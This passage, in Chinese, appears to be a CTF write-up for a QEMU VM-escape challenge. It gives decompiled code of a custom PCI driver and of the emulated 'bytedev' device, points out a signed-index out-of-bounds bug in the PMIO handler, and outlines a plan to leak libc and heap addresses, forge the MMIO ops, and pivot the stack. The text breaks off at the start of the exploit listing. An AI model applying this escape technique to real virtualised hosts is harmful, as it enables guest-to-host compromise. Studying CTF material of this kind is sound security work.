class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v1 = <span class="number">-12</span>;</span><br><span class="line">  v12[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_DC8);</span><br><span class="line">  v3 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">2</span>], <span class="number">0xDC0</span>LL, <span class="number">0xB8</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(a1 + <span class="number">0x148</span>) = v3;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v1 = pci_enable_device(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_DF8);</span><br><span class="line">LABEL_31:</span><br><span class="line">      kfree(v4);</span><br><span class="line">      <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x3D1</span>) &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E28);</span><br><span class="line">LABEL_30:</span><br><span class="line">      pci_disable_device(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x411</span>) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E70);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = pci_request_regions(a1, <span class="string">&quot;ByteDance-CTFDevice&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_EB8);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = pci_ioremap_bar(a1, <span class="number">0LL</span>);</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x18</span>) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_EE0);</span><br><span class="line">LABEL_29:</span><br><span class="line">      pci_release_regions(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x20</span>) = *(_QWORD *)(a1 + <span class="number">0x3F8</span>);</span><br><span class="line">    raw_spin_lock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">0x100</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i;</span><br><span class="line">      <span class="keyword">if</span> ( !bytedev_minor_num[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        bytedev_minor_num[(<span class="keyword">int</span>)i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = <span class="number">-1</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">    raw_spin_unlock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_F08);</span><br><span class="line">LABEL_28:</span><br><span class="line">      pci_iounmap(a1, *(_QWORD *)(v4 + <span class="number">24</span>));</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)v12, <span class="number">0x40</span>uLL, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;bytedev&quot;</span>, v7);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12[<span class="number">0</span>] = <span class="number">0x76656465747962</span>LL;</span><br><span class="line">    v8 = device_create(bytedev_class, <span class="number">0LL</span>, v7 | (bytedev_major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, v12);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v8;</span><br><span class="line">      printk(&amp;unk_F30);</span><br><span class="line">      bytedev_set_unused_minor_num(v7);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="number">32LL</span>;</span><br><span class="line">    v10 = (_DWORD *)(v4 + <span class="number">48</span>);</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v10++ = <span class="number">0</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">8</span>) = a1;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">176</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *(_QWORD *)v4 = v8;</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">16</span>) = v7;</span><br><span class="line">    bytedev_arr[v7] = v4;</span><br><span class="line">    printk(&amp;unk_F60);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数中使用了<code>pci_request_regions</code>对资源进行了探测和占用，导致如果直接使用用户态程序对PCI设备使用时会失败，<strong>这里如果提权成功的话可以通过卸载驱动模块来实现取消对资源的占用从而可以直接在用户态使用PCI设备。</strong>不过题目这里的驱动中已经完全包含了对PCI设备的使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> a3; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v8; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1919810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(_QWORD *)(v4 + <span class="number">0x20</span>);</span><br><span class="line">      v8 = __indword(v7);</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        __outdword(v7 + <span class="number">1</span>, a3);</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_CE8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_BD1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x7C0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">4</span>) &amp;&amp; !*(_DWORD *)(v5 + <span class="number">0x14</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    __outdword(*(_QWORD *)(v4 + <span class="number">0x20</span>), a3);</span><br><span class="line">    v6 = <span class="number">0LL</span>;</span><br><span class="line">    printk(&amp;unk_CC0);</span><br><span class="line">LABEL_8:</span><br><span class="line">    raw_spin_unlock(v4 + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bytedev_ioctl_cold_12();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里如果你想要使用PCI设备那么你必须保证一点的是<code>ds_0-&gt;regs.mode = 1</code>，因为所有地方都存在这个验证，所以我们首先就需要使用ioctl中<code>__outdword(*(_QWORD *)(v4 + 0x20), a3);</code>语句。这里最好动调一下查看一下<code>*(_QWORD *)(v4 + 0x20)</code>和<code>(unsigned int)&amp;current_task) + 0x7C0</code>到底是什么，结果会发现这里实际就是供我们修改<code>ds_0-&gt;regs.mode</code>的已经会验证当前是否为root权限。</p><h3 id="函数分析-1"><a href="#函数分析-1" class="headerlink" title="函数分析"></a>函数分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BYTEPCIDevState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 parent_obj;</span><br><span class="line">  BYTEPCIDevRegs_0 regs;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">char</span> *blk_mem[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是先给一下结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_pmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> blk_idx; <span class="comment">// ebx</span></span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">0xA3</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _mm_mfence();</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status != <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; (<span class="keyword">int</span>)val &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;regs.blk_idx = val;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx] )</span><br><span class="line">        &#123;</span><br><span class="line">          blk_idx = ds_0-&gt;regs.blk_idx;</span><br><span class="line">          ds_0-&gt;blk_mem[blk_idx] = (<span class="keyword">char</span> *)g_malloc(<span class="number">0x200</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( val &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;regs.mode = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在qemu中的漏洞就出现在这样一个函数中，在对val的类型为int类型，所以可以为负数因为<code>blk_mem</code>为结构体中的一个成员导致可以向上进行溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_mmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">107</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status == <span class="number">2</span> &amp;&amp; size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( size == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( size &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( size == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __cdecl <span class="title">byte_dev_mmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">87</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.blk_status != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据mmio这俩函数就可以实现任意地址读写。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里利用方法其实挺简单的，就直接在<code>BYTEPCIDevState</code>结构体上找可以利用的地址计算差值即可。思路就是首先泄漏libc地址再泄漏heap地址即可。最后泄漏ops中的内容，并且伪造ops。在最后劫持ops实现栈迁移到堆地址即可完成利用。</p><h2 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span 